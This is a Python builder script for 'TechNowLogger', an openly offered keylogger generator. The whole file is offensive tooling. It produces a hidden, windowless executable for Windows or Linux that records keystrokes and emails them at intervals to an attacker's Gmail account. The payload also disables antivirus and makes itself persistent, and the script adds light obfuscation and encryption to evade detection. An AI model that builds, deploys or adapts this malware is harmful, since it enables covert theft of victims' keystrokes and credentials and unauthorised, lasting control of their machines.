#!/usr/bin/env python
import encrypt_code
import argparse
import subprocess
import os
import banners
import shutil
from essential_generators import DocumentGenerator

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

WINDOWS_PYTHON_PYINSTALLER_PATH = os.path.expanduser("C:/Python37-32/Scripts/pyinstaller.exe")

def get_arguments():
    parser = argparse.ArgumentParser(description=f'{RED}TechNowLogger v1.2')
    parser._optionals.title = f"{GREEN}Optional Arguments{YELLOW}"
    parser.add_argument("-i", "--interval", dest="interval", help="Time between reports in seconds. default=120", default=120)
    parser.add_argument("-t", "--persistence", dest="time_persistent", help="Becoming Persistence After __ seconds. default=10", default=10)    
    parser.add_argument("-w", "--windows", dest="windows", help="Generate a Windows executable.", action='store_true')
    parser.add_argument("-l", "--linux", dest="linux", help="Generate a Linux executable.", action='store_true')
    

    required_arguments = parser.add_argument_group(f'{RED}Required Arguments{GREEN}')
    required_arguments.add_argument("-e", "--email", dest="email", help="Email address to send reports to.")
    required_arguments.add_argument("-p", "--password", dest="password", help="Password for the email address given in the -e argument.")
    required_arguments.add_argument("-o", "--out", dest="out", help="Output file name.", required=True)
    return parser.parse_args()

def create_keylogger(file_name, interval, email, password, time_persistent):
    with open(file_name, "w+") as file:
        file.write("import keylogger\n")
        file.write(f"technowlogger = keylogger.Keylogger({interval}, \'{email}\', \'{password}\')\n")
        file.write("technowlogger.kill_av()\n")        
        file.write(f"technowlogger.become_persistent({time_persistent})\n")
        file.write("technowlogger.start()\n")
        
def obfuscating_payload(file_name):
    gen = DocumentGenerator()
    text = "#" + gen.sentence() 
    with open(file_name, "a") as file:
        file.write(text)

def compile_for_windows(file_name):
    subprocess.call([WINDOWS_PYTHON_PYINSTALLER_PATH, "--onefile", "--noconsole", "--hidden-import=keylogger", file_name])

def compile_for_linux(file_name):
    subprocess.call(["pyinstaller", "--onefile", "--noconsole", "--hidden-import=keylogger", file_name])

def del_junk_file(file_name):
    build = os.getcwd() + "\\build"
    file_name = os.getcwd() + f"\\{file_name}"
    pycache = os.getcwd() + "\\__pycache__"
    os.remove(file_name)
    os.remove(file_name + ".spec")    
    shutil.rmtree(build)
    shutil.rmtree(pycache)

def exit_greet():
    try:
        os.system('cls')
    except Exception as e:
        os.system('clear')        
    print(GREEN + '''Thank You for using TechNowLogger, Think Great & Touch The Sky!  \n''' + END)
    quit()
    
if __name__ == '__main__':
    os.system('rm -Rf dist')
    try:
        print(banners.get_banner())
        print(f"\t\t{YELLOW}Author: {GREEN}Pushpender | {YELLOW}Website: {GREEN}technowlogy.tk\n")

        arguments = get_arguments()

        print(f'\n{GREEN}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]{GREEN}')
        print(f'\n   {YELLOW}Email:{RED} ' + arguments.email)
        print(f'   {YELLOW}Password:{RED} ' + arguments.password) 
        print(f'   {YELLOW}Log\'s Send Interval:{RED} Every ' + str(arguments.interval) + ' seconds')
        print(f'   {YELLOW}Becomes Persistence After:{RED} ' + str(arguments.time_persistent) + ' seconds')
        print(f'\n{GREEN}[ * * * * * * * * * * * * * * * * * * * * * * * * * ]')
        
        ask = input(f'\n{WHITE}[?] These info above are correct? (y/n) :')
    
        if ask.lower() == 'y':
            pass
        else:
            arguments.email = input('\n[?] Type your gmail to receive logs: ')
            arguments.password = input('[?] Type your gmail password: ')
            arguments.interval = int(input('[?] Time interval to send logs; [In Seconds]: '))
            arguments.time_persistent = int(input('[?] Time after to become persistence; [In Seconds]: '))            

        print(f"\n{YELLOW}[*] Generating Please wait for a while...{MAGENTA}\n")

        create_keylogger(arguments.out, arguments.interval, arguments.email, arguments.password, int(arguments.time_persistent))
        obfuscating_payload(arguments.out)
        
        encrypting_code = encrypt_code.Encrypt()
        encrypting_code.encrypt(arguments.out)

        if arguments.windows:
            compile_for_windows(arguments.out)

        if arguments.linux:
            compile_for_linux(arguments.out)

        print(f"\n{YELLOW}[*] Deleting Junk Files...")
        del_junk_file(arguments.out)
        print(f"{GREEN}[+] Junk Files Removed Successfully!")
        
        if os.path.exists(f'dist/{arguments.out}.exe'):
            print(f"\n{GREEN}[+] Generated Successfully!\n")           
            print(f"\n\n{RED}[***] Don't forget to allow less secure applications in your Gmail account.")
            print(f"{GREEN}Use the following link to do so https://myaccount.google.com/lesssecureapps")        

        else:
            print(f"\n{RED}[!] Failed To Generate Your Payload :(, Please Try Again!\n")
            print(f"\n{GREEN}[:D] Please Contact us on https://github.com/Technowlogy-Pushpender/technowlogger\n")                  
    
    except KeyboardInterrupt:        
        exit_greet()
        
    except Exception as e:
        print(f"\n{RED}[!] Error : {e}")
        

    
    